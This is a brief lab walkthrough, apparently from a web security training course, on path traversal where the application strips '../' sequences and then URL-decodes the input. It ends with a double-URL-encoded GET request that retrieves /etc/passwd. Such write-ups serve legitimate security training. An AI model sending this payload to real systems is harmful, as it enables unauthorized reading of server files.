
# File path traversal, traversal sequences stripped with superfluous URL-decode

This lab contains a file path traversal vulnerability in the display of product images.

The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.

To solve the lab, retrieve the contents of the /etc/passwd file.

To retrieve an image the application uses a GET request with the parameter filename:

To retrieve /etc/passwd we need to use double URL encode the characters:

```
GET /image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
```
